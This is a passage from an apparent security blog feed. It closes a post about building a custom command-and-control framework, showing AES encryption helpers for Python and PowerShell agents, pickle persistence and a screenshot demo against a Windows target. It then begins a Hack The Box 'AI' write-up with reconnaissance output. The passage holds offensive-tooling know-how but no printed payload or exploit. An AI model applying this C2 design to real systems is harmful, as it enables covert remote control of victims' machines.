</span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(iv + cipher.encrypt(raw.encode(<span class="string">"utf-8"</span>)))</span><br></pre></td></tr></table></figure><p>The decryption function does the opposite:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(self,enc)</span>:</span></span><br><span class="line">    </span><br><span class="line">    enc      = base64.b64decode(enc)</span><br><span class="line">    iv       = enc[:<span class="number">16</span>]</span><br><span class="line">    cipher   = AES.new(self.key, AES.MODE_CBC, iv)</span><br><span class="line">    plain    = cipher.decrypt(enc[<span class="number">16</span>:])</span><br><span class="line">    plain    = self.unpad(plain)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> plain</span><br></pre></td></tr></table></figure><p>I created two wrapper function that rely on the <code>AESCipher</code> class to encrypt and decrypt data:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ENCRYPT</span><span class="params">(PLAIN, KEY)</span>:</span></span><br><span class="line"></span><br><span class="line">    c   = AESCipher(KEY)</span><br><span class="line">    enc = c.encrypt(PLAIN)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> enc.decode()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">DECRYPT</span><span class="params">(ENC, KEY)</span>:</span></span><br><span class="line"></span><br><span class="line">    c   = AESCipher(KEY)</span><br><span class="line">    dec = c.decrypt(ENC)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> dec</span><br></pre></td></tr></table></figure><p>And finally there’s the <code>generateKey</code> function which creates a random 32 bytes key and <code>base-64</code> encodes it:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generateKey</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    key    = base64.b64encode(os.urandom(<span class="number">32</span>))</span><br><span class="line">    <span class="keyword">return</span> key.decode()</span><br></pre></td></tr></table></figure><h3 id="PowerShell-Agent-1"><a href="#PowerShell-Agent-1" class="headerlink" title="PowerShell Agent"></a>PowerShell Agent</h3><p>The <code>powershell</code> agent uses the <code>.NET</code> class <code>System.Security.Cryptography.AesManaged</code>. </p><p>First function is the <code>Create-AesManagedObject</code> which instantiates an <code>AesManaged</code> object using the given key and <code>IV</code>. It’s a must to use the same options we decided to use on the server side which are <code>CBC</code> mode, zeros padding and 32 bytes key length:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Create-AesManagedObject</span><span class="params">(<span class="variable">$key</span>, <span class="variable">$IV</span>)</span></span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$aesManaged</span>           = <span class="built_in">New-Object</span> <span class="string">"System.Security.Cryptography.AesManaged"</span></span><br><span class="line">    <span class="variable">$aesManaged</span>.Mode      = [<span class="type">System.Security.Cryptography.CipherMode</span>]::CBC</span><br><span class="line">    <span class="variable">$aesManaged</span>.Padding   = [<span class="type">System.Security.Cryptography.PaddingMode</span>]::Zeros</span><br><span class="line">    <span class="variable">$aesManaged</span>.BlockSize = <span class="number">128</span></span><br><span class="line">    <span class="variable">$aesManaged</span>.KeySize   = <span class="number">256</span></span><br></pre></td></tr></table></figure><p>After that it checks if the provided key and <code>IV</code> are of the type <code>String</code> (which means that the key or the <code>IV</code> is <code>base-64</code> encoded), depending on that it decodes the data before using them, then it returns the <code>AesManaged</code> object.</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$IV</span>) &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$IV</span>.getType().Name <span class="operator">-eq</span> <span class="string">"String"</span>) &#123;</span><br><span class="line">            <span class="variable">$aesManaged</span>.IV = [<span class="type">System.Convert</span>]::FromBase64String(<span class="variable">$IV</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$aesManaged</span>.IV = <span class="variable">$IV</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$key</span>) &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$key</span>.getType().Name <span class="operator">-eq</span> <span class="string">"String"</span>) &#123;</span><br><span class="line">            <span class="variable">$aesManaged</span>.Key = [<span class="type">System.Convert</span>]::FromBase64String(<span class="variable">$key</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$aesManaged</span>.Key = <span class="variable">$key</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$aesManaged</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The <code>Encrypt</code> function takes a key and a plain text string, converts that string to bytes, then it uses the <code>Create-AesManagedObject</code> function to create the <code>AesManaged</code> object and it encrypts the string with a random generated <code>IV</code>.</p><p>It returns the cipher text <code>base-64</code> encoded.</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Encrypt</span><span class="params">(<span class="variable">$key</span>, <span class="variable">$unencryptedString</span>)</span></span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$bytes</span>             = [<span class="type">System.Text.Encoding</span>]::UTF8.GetBytes(<span class="variable">$unencryptedString</span>)</span><br><span class="line">    <span class="variable">$aesManaged</span>        = Create<span class="literal">-AesManagedObject</span> <span class="variable">$key</span></span><br><span class="line">    <span class="variable">$encryptor</span>         = <span class="variable">$aesManaged</span>.CreateEncryptor()</span><br><span class="line">    <span class="variable">$encryptedData</span>     = <span class="variable">$encryptor</span>.TransformFinalBlock(<span class="variable">$bytes</span>, <span class="number">0</span>, <span class="variable">$bytes</span>.Length);</span><br><span class="line">    [<span class="built_in">byte</span>[]] <span class="variable">$fullData</span> = <span class="variable">$aesManaged</span>.IV + <span class="variable">$encryptedData</span></span><br><span class="line">    <span class="variable">$aesManaged</span>.Dispose()</span><br><span class="line">    [<span class="type">System.Convert</span>]::ToBase64String(<span class="variable">$fullData</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The opposite of this process happens with the <code>Decrypt</code> function:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Decrypt</span><span class="params">(<span class="variable">$key</span>, <span class="variable">$encryptedStringWithIV</span>)</span></span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$bytes</span>           = [<span class="type">System.Convert</span>]::FromBase64String(<span class="variable">$encryptedStringWithIV</span>)</span><br><span class="line">    <span class="variable">$IV</span>              = <span class="variable">$bytes</span>[<span class="number">0</span><span class="type">..15</span>]</span><br><span class="line">    <span class="variable">$aesManaged</span>      = Create<span class="literal">-AesManagedObject</span> <span class="variable">$key</span> <span class="variable">$IV</span></span><br><span class="line">    <span class="variable">$decryptor</span>       = <span class="variable">$aesManaged</span>.CreateDecryptor();</span><br><span class="line">    <span class="variable">$unencryptedData</span> = <span class="variable">$decryptor</span>.TransformFinalBlock(<span class="variable">$bytes</span>, <span class="number">16</span>, <span class="variable">$bytes</span>.Length - <span class="number">16</span>);</span><br><span class="line">    <span class="variable">$aesManaged</span>.Dispose()</span><br><span class="line">    [<span class="type">System.Text.Encoding</span>]::UTF8.GetString(<span class="variable">$unencryptedData</span>).Trim([<span class="built_in">char</span>]<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Listeners-Agents-Persistency"><a href="#Listeners-Agents-Persistency" class="headerlink" title="Listeners / Agents Persistency"></a>Listeners / Agents Persistency</h2><p>I used <code>pickle</code> to serialize agents and listeners and save them in databases, when you exit the server it saves all of the agent objects and listeners, then when you start it again it loads those objects again so you don’t lose your agents or listeners. </p><p>For the listeners, <code>pickle</code> can’t serialize objects that use threads, so instead of saving the objects themselves I created a dictionary that holds all the information of the active listeners and serialized that, the server loads that dictionary and starts the listeners again according to the options in the dictionary.</p><p>I created wrapper functions that read, write and remove objects from the databases:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">readFromDatabase</span><span class="params">(database)</span>:</span></span><br><span class="line">    </span><br><span class="line">    data = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> open(database, <span class="string">'rb'</span>) <span class="keyword">as</span> d:</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                data.append(pickle.load(d))</span><br><span class="line">            <span class="keyword">except</span> EOFError:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">writeToDatabase</span><span class="params">(database,newData)</span>:</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">with</span> open(database, <span class="string">"ab"</span>) <span class="keyword">as</span> d:</span><br><span class="line">        pickle.dump(newData, d, pickle.HIGHEST_PROTOCOL)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">removeFromDatabase</span><span class="params">(database,name)</span>:</span></span><br><span class="line">    </span><br><span class="line">    data = readFromDatabase(database)</span><br><span class="line">    final = OrderedDict()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">        final[i.name] = i</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">del</span> final[name]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">with</span> open(database, <span class="string">"wb"</span>) <span class="keyword">as</span> d:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> final:</span><br><span class="line">            pickle.dump(final[i], d , pickle.HIGHEST_PROTOCOL)</span><br></pre></td></tr></table></figure><h2 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h2><p>I will show you a quick demo on a Windows Server 2016 target.</p><p>This is how the home of the server looks like:</p><p><img src="/images/misc/c2/1.png" alt=""></p><p>Let’s start by creating a listener:</p><p><img src="/images/misc/c2/2.png" alt=""></p><p>Now let’s create a payload, I created the three available payloads:</p><p><img src="/images/misc/c2/3.png" alt=""></p><p>After executing the payloads on the target we’ll see that the agents successfully contacted the server:</p><p><img src="/images/misc/c2/4.png" alt=""></p><p>Let’s rename the agents:</p><p><img src="/images/misc/c2/5.png" alt=""></p><p><img src="/images/misc/c2/6.png" alt=""></p><p>I executed 4 simple commands on each agent:</p><p><img src="/images/misc/c2/7.png" alt=""></p><p><img src="/images/misc/c2/8.png" alt=""></p><p><img src="/images/misc/c2/9.png" alt=""></p><p>Then I tasked each agent to quit.</p><p>And that concludes this blog post, as I said before I would appreciate all the feedback and the suggestions so feel free to contact me on twitter <a href="https://www.twitter.com/Ahm3d_H3sham" target="_blank" rel="noopener">@Ahm3d_H3sham</a>.</p><p>If you liked the article tweet about it, thanks for reading.</p>]]></content:encoded>
      
      <comments>https://0xrick.github.io/misc/c2/#disqus_thread</comments>
    </item>
    
    <item>
      <title>Hack The Box - AI</title>
      <link>https://0xrick.github.io/hack-the-box/ai/</link>
      <guid>https://0xrick.github.io/hack-the-box/ai/</guid>
      <pubDate>Sat, 25 Jan 2020 03:00:00 GMT</pubDate>
      <description>
      
        My write-up / walkthrough for AI from Hack The Box.
      
      </description>
      
      
      <content:encoded><![CDATA[<h1 id="Hack-The-Box-AI"><a href="#Hack-The-Box-AI" class="headerlink" title="Hack The Box - AI"></a>Hack The Box - AI</h1><h2 id="Quick-Summary"><a href="#Quick-Summary" class="headerlink" title="Quick Summary"></a>Quick Summary</h2><p>Hey guys, today AI retired and here’s my write-up about it. It’s a medium rated Linux box and its ip is <code>10.10.10.163</code>, I added it to <code>/etc/hosts</code> as <code>ai.htb</code>. Let’s jump right in !<br><img src="/images/hackthebox/ai/0.png" alt=""></p><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><p>As always we will start with <code>nmap</code> to scan for open ports and services:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;AI# nmap -sV -sT -sC -o nmapinitial ai.htb</span><br><span class="line">Starting Nmap 7.80 ( https:&#x2F;&#x2F;nmap.org ) at 2020-01-24 17:46 EST</span><br><span class="line">Nmap scan report for ai.htb (10.10.10.163)</span><br><span class="line">Host is up (0.83s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 6d:16:f4:32:eb:46:ca:37:04:d2:a5:aa:74:ed:ab:fc (RSA)</span><br><span class="line">|   256 78:29:78:d9:f5:43:d1:cf:a0:03:55:b1:da:9e:51:b6 (ECDSA)</span><br><span class="line">|_  256 85:2e:7d:66:30:a6:6e:30:04:82:c1:ae:ba:a4:99:bd (ED25519)</span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: Hello AI!</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 123.15 seconds</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;AI#</span><br></pre></td></tr></table></figure><p>We got <code>ssh</code> on port 22 and <code>http</code> on port 80.</p><h2 id="Web-Enumeration"><a href="#Web-Enumeration" class="headerlink" title="Web Enumeration"></a>Web Enumeration</h2><p>The index page was empty:<br><img src="/images/hackthebox/ai/1.png" alt=""><br>By hovering over the logo a menu appears:<br><img src="/images/hackthebox/ai/2.png" alt=""><br>The only interesting page there was <code>/ai.php</code>. From the description (“Drop your query using <code>wav</code> file.”) my first guess was that it’s a speech recognition service that processes users’ input and executes some query based on that processed input, And there’s also a possibility that this query is a <code>SQL</code> query but we’ll get to that later.:<br><img src="/images/hackthebox/ai/3.png" alt=""><br>I also found another interesting page with <code>gobuster</code>:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;AI# gobuster dir -u http:&#x2F;&#x2F;ai.htb&#x2F; -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirb&#x2F;common.txt -x php</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">Gobuster v3.0.1</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">[+] Url:            http:&#x2F;&#x2F;ai.htb&#x2F;</span><br><span class="line">[+] Threads:        10</span><br><span class="line">[+] Wordlist:       &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirb&#x2F;common.txt</span><br><span class="line">[+] Status codes:   200,204,301,302,307,401,403</span><br><span class="line">[+] User Agent:     gobuster&#x2F;3.0.1</span><br><span class="line">[+] Extensions:     php</span><br><span class="line">[+] Timeout:        10s</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">2020&#x2F;01&#x2F;24 18:57:23 Starting gobuster</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">----------</span><br><span class="line"> REDACTED</span><br><span class="line">----------</span><br><span class="line">&#x2F;intelligence.php (Status: 200)</span><br><span class="line">----------</span><br><span class="line"> REDACTED</span><br><span class="line">----------</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">2020&#x2F;01&#x2F;24 19:00:49 Finished</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;AI#</span><br></pre></td></tr></table></figure><p>It had some instructions on how to use their speech recognition:<br><img src="/images/hackthebox/ai/4.png" alt=""><br>I used <a href="https://ttsmp3.com/" target="_blank" rel="noopener">ttsmp3.com</a> to generate audio files and I created a test file:<br><img src="/images/hackthebox/ai/5.png" alt=""><br>But because the application only accepts <code>wav</code> files I converted the <code>mp3</code> file with <code>ffmpeg</code>:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;AI&#x2F;test# mv ~&#x2F;Downloads&#x2F;ttsMP3.com_VoiceText_2020-1-24_19_35_47.mp3 .</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;AI&#x2F;test# ffmpeg -i ttsMP3.com_VoiceText_2020-1-24_19_35_47.mp3 ttsMP3.com_VoiceText_2020-1-24_19_35_47.wav</span><br><span class="line">ffmpeg version 4.2.1-2+b1 Copyright (c) 2000-2019 the FFmpeg developers</span><br><span class="line">  built with gcc 9 (Debian 9.2.1-21)</span><br><span class="line">  configuration: --prefix&#x3D;&#x2F;usr --extra-version&#x3D;2+b1 --toolchain&#x3D;hardened --libdir&#x3D;&#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu --incdir&#x3D;&#x2F;usr&#x2F;include&#x2F;x86_64-linux-gnu --arch&#x3D;amd64 --enable-gpl --disable-stripping --enable-avresample --disable-filter&#x3D;resample --enable-avisynth --enable-gnutls --enable-ladspa --enable-libaom --enable-libass --enable-libbluray --enable-libbs2b --enable-libcaca --enable-libcdio --enable-libcodec2 --enable-libflite --enable-libfontconfig --enable-libfreetype --enable-libfribidi --enable-libgme --enable-libgsm --enable-libjack --enable-libmp3lame --enable-libmysofa --enable-libopenjpeg --enable-libopenmpt --enable-libopus --enable-libpulse --enable-librsvg --enable-librubberband --enable-libshine --enable-libsnappy --enable-libsoxr --enable-libspeex --enable-libssh --enable-libtheora --enable-libtwolame --enable-libvidstab --enable-libvorbis --enable-libvpx --enable-libwavpack --enable-libwebp --enable-libx265 --enable-libxml2 --enable-libxvid --enable-libzmq --enable-libzvbi --enable-lv2 --enable-omx --enable-openal --enable-opengl --enable-sdl2 --enable-libdc1394 --enable-libdrm --enable-libiec61883 --enable-chromaprint --enable-frei0r --enable-libx264 --enable-shared</span><br><span class="line">  libavutil      56. 31.100 &#x2F; 56. 31.100</span><br><span class="line">  libavcodec     58. 54.100 &#x2F; 58. 54.100</span><br><span class="line">  libavformat    58. 29.100 &#x2F; 58. 29.100</span><br><span class="line">  libavdevice    58.  8.100 &#x2F; 58.  8.100</span><br><span class="line">  libavfilter     7. 57.100 &#x2F;  7. 57.100</span><br><span class="line">  libavresample   4.  0.  0 &#x2F;  4.  0.  0</span><br><span class="line">  libswscale      5.  5.100 &#x2F;  5.  5.100</span><br><span class="line">  libswresample   3.  5.100 &#x2F;  3.  5.100</span><br><span class="line">  libpostproc    55.  5.100 &#x2F; 55.  5.100</span><br><span class="line">[mp3 @ 0x55b33e5f88c0] Estimating duration from bitrate, this may be inaccurate</span><br><span class="line">Input #0, mp3, from &#39;ttsMP3.com_VoiceText_2020-1-24_19_35_47.mp3&#39;:</span><br><span class="line">  Metadata:</span><br><span class="line">    encoder         : Lavf57.71.100</span><br><span class="line">  Duration: 00:00:00.63, start: 0.000000, bitrate: 48 kb&#x2F;s</span><br><span class="line">    Stream #0:0: Audio: mp3, 22050 Hz, mono, fltp, 48 kb&#x2F;s</span><br><span class="line">Stream mapping:</span><br><span class="line">  Stream #0:0 -&gt; #0:0 (mp3 (mp3float) -&gt; pcm_s16le (native))</span><br><span class="line">Press [q] to stop, [?] for help</span><br><span class="line">Output #0, wav, to &#39;ttsMP3.com_VoiceText_2020-1-24_19_35_47.wav&#39;:</span><br><span class="line">  Metadata:</span><br><span class="line">    ISFT            : Lavf58.29.100</span><br><span class="line">    Stream #0:0: Audio: pcm_s16le ([1][0][0][0] &#x2F; 0x0001), 22050 Hz, mono, s16, 352 kb&#x2F;s</span><br><span class="line">    Metadata:</span><br><span class="line">      encoder         : Lavc58.54.100 pcm_s16le</span><br><span class="line">size&#x3D;      27kB time&#x3D;00:00:00.62 bitrate&#x3D; 353.8kbits&#x2F;s speed&#x3D; 146x    </span><br><span class="line">video:0kB audio:27kB subtitle:0kB other streams:0kB global headers:0kB muxing overhead: 0.282118%</span><br><span 